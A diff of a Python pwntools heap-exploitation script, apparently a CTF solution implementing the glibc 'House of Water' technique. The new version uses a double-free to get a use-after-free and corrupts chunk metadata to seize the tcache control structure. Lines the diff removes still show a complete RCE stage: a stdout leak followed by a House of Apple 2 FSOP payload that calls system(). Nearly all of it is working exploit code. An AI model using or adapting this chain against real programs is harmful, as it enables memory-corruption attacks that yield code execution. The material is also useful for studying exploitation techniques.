@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
-# RCE from the House of Water with a UAF.
+# House of Water, but with a double-free.
+# There are only two significant changes in this from 'fsop_solve.py':
+# Using our double-free to trigger a UAF on 'playground',
+# and performing some edits from 'playground' instead of start/end.
 
 from pwn import *
 import io_file
@@ -49,7 +52,7 @@ def get_leak():
     
 def exit():
     p.sendlineafter(b">",b"5")
-
+    
 def main():
     global p
     p = conn()
@@ -66,9 +69,11 @@ def main():
     middle = malloc(0x90-8) # 'middle' unsortedbin chunk
 
 
-    playground = malloc(0x20 + 0x30 + 0x500 + (0x90-8)*2)
+    _playground = malloc(0x20 + 0x30 + 0x500 + (0x90-8)*2)
     guard = malloc(0x18) # guard 1 (at bottom of heap)
-    free(playground) # cause UAF
+    free(_playground)
+    playground = malloc(0x20 + 0x30 + 0x500 + (0x90-8)*2) # reclaim freed chunk
+    free(_playground) # double-free _playground, now we have a UAF on playground
     guard = malloc(0x18) # guard 2 (remaindered, right below the 8 0x90 chunks)
     
     # begin to remainder 'playground'
@@ -103,12 +108,12 @@ def main():
     
     edit(playground,p64(0x31),0x4e8) # edit size of start_M from 0x91 to 0x31
     free(start_M) # now &start is in the 0x31 tcache bin
-    edit(start_M,p64(0x91),8) # this corrupts start's metadata (because it's 0x10 bytes behind) so we repair its size
+    edit(playground,p64(0x91),0x4f8) # repair start's size from playground
     
     # now we do the same to end_M, but we free it into the 0x21 bin instead
     edit(playground,p64(0x21),0x5a8)
     free(end_M)
-    edit(end_M,p64(0x91),8)
+    edit(playground,p64(0x91),0x5b8)
     
     # now we fill up the 0x90 tcache
     for i in range(7):
@@ -131,45 +136,18 @@ def main():
     this script would have a 1/256 chance working from a truly leakless perspective.
     """
     libc_leak, heap_leak = get_leak()
-    edit(start,p16((heap_leak << 12) + 0x80))
-    edit(end,p16((heap_leak << 12) + 0x80),8)
+    # overwrite LSB of start and end's fd/bk pointers
+    edit(playground,p16((heap_leak << 12) + 0x80),0x500) # start fd points to 'fake'
+    edit(playground,p16((heap_leak << 12) + 0x80),0x5c8) # end bk points to 'fake'
     
-    exit_lsb = (libc_leak << 12) + (libc.sym['exit'] & 0xfff) # last 2 bytes of exit()
-    stdout_offset = libc.sym['_IO_2_1_stdout_'] - libc.sym['exit'] # just relative offset, no libc leak yet
-    stdout_lsb = (exit_lsb + stdout_offset) & 0xffff # last 2 bytes of stdout
-    info(f"{stdout_lsb=:#x}")
+    # exit_lsb = (libc_leak << 12) + (libc.sym['exit'] & 0xfff) # last 2 bytes of exit()
+    # stdout_offset = libc.sym['_IO_2_1_stdout_'] - libc.sym['exit'] # just relative offset, no libc leak yet
+    # stdout_lsb = (exit_lsb + stdout_offset) & 0xffff # last 2 bytes of stdout
+    # info(f"{stdout_lsb=:#x}")
     
     win = malloc(0x888) # tcache_perthread_struct control
+    p.interactive()
     
     
-    """
-    Step 2: RCE
-    We will first perform a partial overwrite of the stdout file stream
-    to force it to leak out a libc pointer to us, then use the House of Apple 2
-    to get RCE using FSOP.
-    """
-    
-    edit(win,p16(stdout_lsb),8) # change 0x31 bin to point to stdout
-    stdout = malloc(0x28)
-    # force leak w/ _IO_write_base partial overwrite
-    edit(stdout,p64(0xfbad3887)+p64(0)*3+p8(0)) 
-    libc_leak = u64(p.recvn(8))
-    libc.address = libc_leak - (libc.sym['_IO_2_1_stdout_']+132)
-    info(f"{libc.address=:#x}")
-    
-    # prepare house of apple2 payload
-    file = io_file.IO_FILE_plus_struct() 
-    payload = file.house_of_apple2_execmd_when_do_IO_operation(
-        libc.sym['_IO_2_1_stdout_'],
-        libc.sym['_IO_wfile_jumps'],
-        libc.sym['system'])
-    # editing 60th bin (0x3e0) of tcache for full stdout control
-    edit(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
-    full_stdout = malloc(0x3e0-8)
-    edit(full_stdout,payload)
-
-    p.interactive() # PLIMB's up!
-
-
 if __name__ == "__main__":
     main()
